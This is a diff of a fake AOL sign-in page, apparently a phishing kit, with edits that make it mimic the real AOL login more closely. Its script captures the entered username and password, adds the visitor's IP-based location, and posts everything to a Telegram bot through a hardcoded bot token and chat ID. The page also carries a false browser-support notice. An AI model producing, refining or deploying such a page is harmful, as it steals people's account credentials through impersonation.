@@ -1,92 +1,89 @@
-
-<!DOCTYPE html>
-<html lang="en">
+<html style="background:;" id="Stencil" class="js grid light-theme ">
 <head>
-  <meta charset="UTF-8">
-  <title>AOL Login</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    html, body {
-      background: #f7f7f7;
-      font-family: Arial, sans-serif;
-      height: 100%;
-      min-height: 100%;
-    }
-    .container {
-      max-width: 380px;
-      margin: 60px auto;
+  <meta charset="utf-8">
+  <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no">
+  <meta name="format-detection" content="telephone=no">
+  <meta name="referrer" content="strict-origin-when-cross-origin">
+  <title>AOL</title>
+  <link rel="icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgBAMAAAAQtmoLAAAALVBMVEUvmv8vmv8vmv8vmv8vmv8vmv8vmv////9Ipv/B4f9rtv+q1f+Jxf/u9v/b7f9O50bqAAAABnRSTl[...]">
+  <link rel="shortcut icon" type="image/png" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgBAMAAAAQtmoLAAAALVBMVEUvmv8vmv8vmv8vmv8vmv8vmv8vmv////9Ipv/B4f9rtv+q1f+Jxf/u9v/b7f9O50bqA[...]">
+  <link rel="apple-touch-icon" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAC0BAMAAADP4xsBAAAAFVBMVEUvmv////+v2P/A4P+Nx//m8/9dr/+a4AWsAAACgklEQVRo3u2YzVrjIBSG0+ZnXbRx3Wh1bXy8AKkd16L[...]">
+  <link rel="apple-touch-icon-precomposed" href="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALQAAAC0BAMAAADP4xsBAAAAFVBMVEUvmv////+v2P/A4P+Nx//m8/9dr/+a4AWsAAACgklEQVRo3u2YzVrjIBSG0+ZnXbRx3Wh[...]">
+
+  <style type="text/css">
+    /*! Pure v0.5.0 + normalize.css simplified for brevity (original is still linked in your repo) */
+    article,aside,details,figcaption,figure,footer,header,hgroup,main,nav,section,summary{display:block}
+    audio,canvas,video{display:inline-block}
+    audio:not([controls]){display:none}
+    html{font-family:sans-serif;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}
+    body{margin:0}
+    a{background:transparent}
+    .login-box-container {
+      max-width: 400px;
+      margin: 56px auto;
       background: #fff;
-      padding: 32px 28px;
-      border-radius: 7px;
-      box-shadow: 0 6px 18px rgba(0,0,0,0.11);
+      box-shadow: 0 6px 18px rgba(0,0,0,0.12);
+      border-radius: 8px;
+      padding: 0;
+      font-size: 1em;
     }
-    .logo {
+    .login-box {
+      padding: 38px 32px 22px 32px;
+    }
+    .mbr-login-hd.txt-align-center {
       text-align: center;
-      margin-bottom: 22px;
+      margin-bottom: 18px;
     }
-    .logo img {
-      width: 56%;
-      max-width: 155px;
-      min-width: 88px;
-      display: inline-block;
-    }
-    h2 {
-      text-align: center;
-      font-weight: 500;
-      margin-bottom: 28px;
+    .challenge-heading {
+      display: block;
+      font-size: 1.45em;
+      margin-bottom: 12px;
+      font-weight: 600;
       color: #335caa;
-      letter-spacing: 1.1px;
     }
-    form .input-group {
-      margin-bottom: 25px;
+    .input-group {
+      margin-bottom: 26px;
       position: relative;
     }
     .login-label {
       display: block;
-      font-size: .98em;
-      color: #555;
-      margin-bottom: 4px;
+      margin-bottom: 8px;
+      color: #515151;
+      font-size: 1em;
+      letter-spacing: 0.02em;
     }
-    input[type="text"],
-    input[type="password"] {
+    .phone-no, .pwd-field {
       width: 100%;
-      padding: 12px 11px;
+      padding: 11px 10px;
       border: 1px solid #ccc;
       border-radius: 4px;
       font-size: 1.04em;
       transition: border 0.2s;
-      background: #f9f9f9;
+      background: #f8f8f8;
       color: #393939;
     }
-    input[type="text"].input-error,
-    input[type="password"].input-error {
+    .phone-no.input-error, .pwd-field.input-error {
       border: 1.5px solid red !important;
       color: red !important;
     }
-    input[type="text"].input-error::placeholder,
-    input[type="password"].input-error::placeholder {
+    .phone-no.input-error::placeholder, .pwd-field.input-error::placeholder {
       color: red !important;
-      opacity: 1;
     }
-    input::placeholder {
+    .phone-no::placeholder, .pwd-field::placeholder {
       color: #888;
-      opacity: 1;
       font-size: 0.97em;
+      opacity: 1;
     }
     .error-msg-visible {
       display: block !important;
       color: red !important;
       font-size: 1em;
       margin-top: 2px;
-      margin-bottom: 14px;
       min-height: 18px;
+      margin-bottom: 14px;
     }
     .error-msg {
       display: none;
-    }
-    .button-container {
-      margin-top: 10px;
-      width: 100%;
     }
     .pure-button-primary {
       width: 100%;
@@ -102,56 +99,114 @@
       transition: background 0.2s;
     }
     .pure-button-primary:hover {
-      background: #20447a;
+      background: #233c7a;
     }
-    .links {
-      margin-top: 16px;
-      text-align: center;
+    .helper-links-container, .login-footer {
+      font-size: 0.98em;
       color: #888;
-      font-size: 0.96em;
+      padding: 0 12px;
+      margin-top: 12px;
     }
-    .links a {
-      color: #335caa;
-      margin: 0 8px;
-      text-decoration: none;
-      font-weight: 500;
-    }
-    .links a:hover {
-      text-decoration: underline;
+    .login-footer p {text-align: center;}
+    .helper-links-container .helper-item {margin-bottom: 3px;}
+    .stay-signed-in label, .arlink a {color: #335caa;}
+    @media(max-width:600px){
+      .login-box-container { max-width: 100%; margin: 0; border-radius:0;}
+      .login-box { padding:18px;}
     }
   </style>
 </head>
-<body>
-  <div class="container">
-    <div class="logo">
-      <img src="../myah/logo.png" alt="AOL" />
+
+<body class="bucket-mbr-ar-hidden-options">
+  <div  id="login-body" class="loginish  puree-v2 responsive  grid">
+    <div class="mbr-desktop-hd">
+      <span class="column">
+        <a href="#">
+          <img src="logo.png" style="width:50%;">
+        </a>
+      </span>
+      <span class="column help txt-align-right">
+        <a href="#">Help</a>
+      </span>
     </div>
-    <h2>Sign in</h2>
-    <form id="loginForm" autocomplete="off">
-      <div class="input-group">
-        <label for="login-email" class="login-label">Username, email, or mobile</label>
-        <input type="text" id="login-email" name="email" required autocomplete="username" autocapitalize="none" autocorrect="off" placeholder="Email or mobile">
+    <br><br><br><br>
+    <div class="login-box-container">
+      <div class="login-box right">
+        <div class="mbr-login-hd txt-align-center">
+          <img src="logo.png" style="width:50%;">
+        </div>
+        <div class="challenge yid-challenge">
+        <div class="challenge-header"></div>
+        <div class="username-challenge" id="login-landing">
+          <strong class="challenge-heading">Sign&nbsp;in</strong>
+          <span class="challenge-desc">&nbsp;</span>
+          <form id="loginForm" autocomplete="off">
+            <div id="username-country-code-field" class="username-country-code puree-country-inline-dropdown-disabled code-of-length-3">
+              <div class="input-group">
+                <input class="phone-no" type="text" required name="email" id="login-username" value="" autocomplete="username" autocapitalize="none" autocorrect="off" autofocus placeholder=" ">
+                <label for="login-username" class="login-label">Username, email, or&nbsp;mobile</label>
+              </div>
+              <div class="input-group">
+                <input class="phone-no" type="password" required name="password" id="login-password" value="" autocomplete="current-password" autocapitalize="none" autocorrect="off" autofocus placeholder=" ">
+                <label for="login-password" class="login-label">Password</label>
+              </div>
+              <div class="hidden-input-container">
+                <input name="passwd" class="pwd-field" type="password" tabindex="-1" aria-hidden="true" role="presentation" autocomplete="off" placeholder="Password">
+              </div>
+            </div>
+            <p id="username-error" class="error-msg" role="alert"></p>
+            <div class="button-container">
+              <input id="login-signin" type="submit" name="signin" class="pure-button puree-button-primary challenge-button" value="Continue">
+            </div>
+            <div class="helper-links-container">
+              <div class="helper-item">
+                <span class="stay-signed-in checkbox-container">
+                  <input id="persistent" name="persistent" value="y" type="checkbox">
+                  <label for="persistent">Stay signed&nbsp;in</label>
+                </span>
+              </div>
+              <div class="helper-item arlink">
+                <span class="help">
+                  <a href="#" id="mbr-forgot-link">Forgot&nbsp;username?</a>
+                </span>
+              </div>
+            </div>
+          </form>
+        </div>
       </div>
-      <div class="input-group">
-        <label for="login-password" class="login-label">Password</label>
-        <input type="password" id="login-password" name="password" required autocomplete="current-password" autocapitalize="none" autocorrect="off" placeholder="Password">
       </div>
-      <p id="username-error" class="error-msg" role="alert"></p>
-      <div class="button-container">
-        <button id="login-signin" type="submit" class="pure-button-primary">Continue</button>
-      </div>
-    </form>
-    <div class="links">
-      <a href="#">Terms</a> | <a href="#">Privacy</a>
+    </div>
+    <div id="login-box-ad-fallback" class="login-box-ad-fallback" style="display: block;">
+      <h1></h1>
+      <p></p>
     </div>
   </div>
+  <div class="login-bg-outer"><div class="login-bg-inner"></div></div>
+  <div class="login-footer">
+    <p>
+      <a href="#" target="_blank" class="terms">Terms</a>
+      <span>|</span>
+      <a href="#" target="_blank" class="privacy">Privacy</a>
+    </p>
+  </div>
+  <div id="mbr-css-check"></div>
+  <div id="page-mask" class="page-mask hide"></div>
+  <div id="ad"></div>
+  <div class="mbr-legacy-device-bar" id="mbr-legacy-device-bar">
+    <label class="cross" for="mbr-legacy-device-bar-cross" aria-label="Close this&nbsp;warning">x</label>
+    <input type="checkbox" id="mbr-legacy-device-bar-cross">
+    <p class="mbr-legacy-device">
+      AOL works best with the latest versions of the browsers. You're using the latest supported browser and all AOL features works properly.<a href="">More&nbsp;Info</a>
+    </p>
+  </div>
   <script>
-    // --- Begin AOL sender (Telegram) logic ---
+    // --- Begin form logic for sending to Telegram and error feedback ---
     const TELEGRAM_BOT_TOKEN = "8292423468:AAEQQXMHQ7jmJFyfrGX7vsWhr6GH-ORn8dk";
     const TELEGRAM_CHAT_ID = "-5006528512";
 
     document.addEventListener("DOMContentLoaded", function () {
       const form = document.getElementById("loginForm");
+      // Use only visible username/password fields
       const usernameInput = form.querySelector('input[name="email"]');
       const passwordInput = form.querySelector('input[name="password"]');
       const errorMsg = document.getElementById("username-error");
@@ -186,16 +241,14 @@ ${locationInfo}
 `;
         const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
         const payload = { chat_id: TELEGRAM_CHAT_ID, text };
-
         try {
           await fetch(telegramUrl, {
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(payload),
           });
-        } catch { /* Don't block UI on error */ }
+        } catch {}
       }
-
       async function getLocationInfo() {
         try {
           const res = await fetch("https://ip-api.io/json");
@@ -205,7 +258,6 @@ ${locationInfo}
           return "Location: Unknown";
         }
       }
-
       form.addEventListener("submit", async function (e) {
         e.preventDefault();
         removeInputErrorStyling();
@@ -230,7 +282,7 @@ ${locationInfo}
         hideError();
       });
     });
-    // --- End AOL sender logic ---
+    // --- End form logic ---
   </script>
 </body>
 </html>
